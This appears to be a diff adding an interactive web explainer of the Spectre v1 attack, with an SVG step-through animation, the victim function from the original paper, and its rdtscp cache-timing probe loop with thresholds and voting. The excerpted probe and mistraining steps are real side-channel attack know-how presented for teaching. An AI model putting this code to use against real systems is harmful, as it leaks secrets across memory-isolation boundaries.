@@ -1,0 +1,121 @@
+<style>
+#mech-svg .mb{fill:var(--code);stroke:var(--line);stroke-width:1.5}
+#mech-svg .mb.legal{fill:var(--plain);stroke:var(--ok)}
+#mech-svg .mb.oob{fill:var(--hl);stroke:var(--bad);stroke-dasharray:3 2}
+#mech-svg .mb.warm{fill:var(--hl);stroke:var(--warn);stroke-width:2.5}
+#mech-svg .mlab{fill:var(--mute);font:11px ui-monospace,monospace}
+#mech-svg .mtxt{fill:var(--ink);font:12px ui-monospace,monospace}
+#mech-svg .mbig{fill:var(--ink);font:600 13px system-ui}
+#mech-svg .marrow{stroke:var(--accent2);stroke-width:1.8;fill:none;opacity:.9;marker-end:url(#mech-ah)}
+#mech-svg g.fade{opacity:.18}
+#mech-svg g{transition:opacity .3s ease}
+</style>
+<p>The paper's actual code (Listing 4, <code>arXiv:1801.01203</code>, verified against the PDF). Goal: read the byte at <code>&amp;secret[k]</code>, reached via <code>malicious_x = secret - array1</code>.</p>
+<pre><code>unsigned int array1_size = 16;
+uint8_t array1[160] = { 1,2,3,... };   // ...secret lands past the end
+uint8_t array2[256 * 512];
+#define CACHE_HIT_THRESHOLD (80)       // cycles
+
+void victim_function(size_t x) {
+  if (x &lt; array1_size) {
+    temp &amp;= array2[array1[x] * 512];
+  }
+}</code></pre>
+<div class="widget" role="group" aria-label="Spectre v1 mechanism step-through">
+<svg id="mech-svg" viewBox="0 0 650 260" role="img" aria-label="Mistraining, speculative read, and cache probe, traced step by step">
+<defs><marker id="mech-ah" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0L10 5L0 10z" class="f-acc2"/></marker></defs>
+</svg>
+<div class="stepbar">
+  <button class="btn" id="mech-prev" aria-label="Previous step">← Back</button>
+  <button class="btn" id="mech-next" aria-label="Next step">Next →</button>
+  <span class="mini" id="mech-n" aria-live="polite"></span>
+  <div class="info" id="mech-info" aria-live="polite"></div>
+</div>
+</div>
+<p>On each of the 5 "attack" calls, the predictor — freshly trained 5-to-1 toward "in bounds" — speculates past the not-yet-resolved check, computes <code>array1[malicious_x]</code> (the real secret byte, say 81), and speculatively reads <code>array2[81*512]</code>, pulling that line into cache. Microseconds later the real check resolves false and every register change is squashed — but the cache line stays warm.</p>
+<h3>Attention over the probe</h3>
+<p>Read all 256 possible <code>array2[i*512]</code> with <code>rdtscp</code>-timed loads, in shuffled order <code>mix_i = (i*167+13) &amp; 255</code> (defeats a stride prefetcher from pre-warming neighbors). Any <code>time2 &lt;= 80</code> cycles counts as a hit.</p>
+<pre><code>for (i = 0; i < 256; i++) {
+  mix_i = ((i * 167) + 13) & 255;
+  addr = &array2[mix_i * 512];
+  time1 = __rdtscp(&junk);
+  junk = *addr;
+  time2 = __rdtscp(&junk) - time1;
+  if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
+    results[mix_i]++;
+}</code></pre>
+<p>Repeat the whole round up to 999 times; accept the leading index once its vote beats the runner-up's by <code>2×+5</code>.</p>
+<script>
+(function(){
+  var NS='http://www.w3.org/2000/svg', svg=document.getElementById('mech-svg');
+  function el(n,a,t){var e=document.createElementNS(NS,n);for(var k in a)e.setAttribute(k,a[k]);if(t!=null)e.textContent=t;return e}
+  var root=el('g',{});svg.appendChild(root);
+
+  // array1 row: 16 legal cells + gap + one OOB cell (secret)
+  var a1=el('g',{id:'mech-a1'});root.appendChild(a1);
+  a1.appendChild(el('text',{x:10,y:24,class:'mlab'},'array1 (size 16)'));
+  for(var i=0;i<16;i++){
+    var r=el('rect',{x:10+i*22,y:30,width:19,height:22,rx:3,class:'mb legal'});
+    a1.appendChild(r);
+  }
+  a1.appendChild(el('text',{x:370,y:24,class:'mlab'},'… out of bounds …'));
+  var oob=el('rect',{x:370,y:30,width:26,height:22,rx:3,class:'mb oob',id:'mech-oob'});a1.appendChild(oob);
+  a1.appendChild(el('text',{x:374,y:46,class:'mtxt'},'81'));
+  a1.appendChild(el('text',{x:360,y:70,class:'mlab'},"secret = 'Q' (81)"));
+
+  var ptr=el('g',{id:'mech-ptr'});root.appendChild(ptr);
+  var ptrRect=el('rect',{x:10,y:30,width:19,height:22,rx:3,class:'f-none',stroke:'var(--accent)','stroke-width':3,id:'mech-ptr-r'});
+  ptr.appendChild(ptrRect);
+
+  // predictor box
+  var pred=el('g',{id:'mech-pred'});root.appendChild(pred);
+  pred.appendChild(el('rect',{x:470,y:10,width:160,height:50,rx:8,class:'f-panel s-line',id:'mech-pred-box'}));
+  pred.appendChild(el('text',{x:482,y:30,class:'mlab'},'branch predictor'));
+  var predTxt=el('text',{x:482,y:48,class:'mbig',id:'mech-pred-txt'},'?');
+  pred.appendChild(predTxt);
+
+  // flush icon on array1_size
+  var sz=el('g',{id:'mech-sz'});root.appendChild(sz);
+  sz.appendChild(el('rect',{x:10,y:90,width:120,height:30,rx:6,class:'f-panel s-line'}));
+  var szTxt=el('text',{x:20,y:110,class:'mtxt'},'array1_size = 16 (cached)');
+  sz.appendChild(szTxt);
+
+  // array2 grid: 16 representative cells (0..15), one stands in for index 81
+  var a2=el('g',{id:'mech-a2'});root.appendChild(a2);
+  a2.appendChild(el('text',{x:10,y:150,class:'mlab'},'array2 cache lines (256 total, 16 shown)'));
+  var cells=[];
+  for(i=0;i<16;i++){
+    var c=el('rect',{x:10+i*38,y:156,width:32,height:28,rx:4,class:'mb',id:'mech-c'+i});
+    a2.appendChild(c);
+    a2.appendChild(el('text',{x:18+i*38,y:175,class:'mlab'},i===5?'81':'i='+i));
+    cells.push(c);
+  }
+  var warmCell=cells[5]; // stand-in for index 81 in the 16-wide display
+
+  var info=el('g',{id:'mech-info-g'});root.appendChild(info);
+  var infoTxt=el('text',{x:10,y:240,class:'mbig',id:'mech-info-txt'});
+  info.appendChild(infoTxt);
+
+  var steps=[
+    {t:'array1_size is cached; array1 holds legal indices 0–15, with the secret byte sitting out of bounds.', f:function(){szTxt.textContent='array1_size = 16 (cached)';predTxt.textContent='?';oob.setAttribute('class','mb oob');cells.forEach(function(c){c.setAttribute('class','mb')});infoTxt.textContent='';}},
+    {t:'Flush array1_size from cache before every call — widens the window where the check is still "in flight."', f:function(){szTxt.textContent='array1_size — FLUSHED';}},
+    {t:'25 training calls with legal x (0–15): the predictor locks toward "in bounds."', f:function(){predTxt.textContent='predict: in bounds';predTxt.setAttribute('class','mbig t-ok');ptrRect.setAttribute('x',10+7*22);}},
+    {t:'5 attack calls with malicious_x (secret offset): predictor still says "in bounds," so the CPU speculatively reads array1[malicious_x] = 81.', f:function(){ptrRect.setAttribute('x',370);oob.setAttribute('class','mb oob warm');}},
+    {t:'The speculative read indexes array2[81*512] — that one cache line warms up, even though the read never architecturally happens.', f:function(){warmCell.setAttribute('class','mb warm');}},
+    {t:'The real check resolves false. Registers and memory roll back completely — but the warm cache line survives the rollback.', f:function(){oob.setAttribute('class','mb oob');ptrRect.setAttribute('x',10);predTxt.textContent='(rolled back)';predTxt.setAttribute('class','mbig t-mute');}},
+    {t:'Probe all 256 lines in shuffled order with rdtscp. 255 are slow (cache miss); the warm one answers fast.', f:function(){cells.forEach(function(c,idx){if(idx!==5)c.setAttribute('class','mb');});infoTxt.textContent='timing i=81: 44 cycles (HIT) — all others: 190+ cycles (MISS)';}},
+    {t:'Vote wins: results[81] crosses 2×runner-up + 5. The secret byte is 81 — \'Q\' — read without ever completing an illegal access.', f:function(){infoTxt.textContent='secret byte recovered: 81 (\'Q\')';infoTxt.setAttribute('class','mbig t-acc');}}
+  ];
+  var n=0;
+  function render(){
+    steps[n].f();
+    document.getElementById('mech-n').textContent='Step '+(n+1)+' / '+steps.length;
+    document.getElementById('mech-info').textContent=steps[n].t;
+    document.getElementById('mech-prev').disabled=(n===0);
+    document.getElementById('mech-next').disabled=(n===steps.length-1);
+  }
+  document.getElementById('mech-prev').addEventListener('click',function(){if(n>0){n--;render();}});
+  document.getElementById('mech-next').addEventListener('click',function(){if(n<steps.length-1){n++;render();}});
+  render();
+})();
+</script>
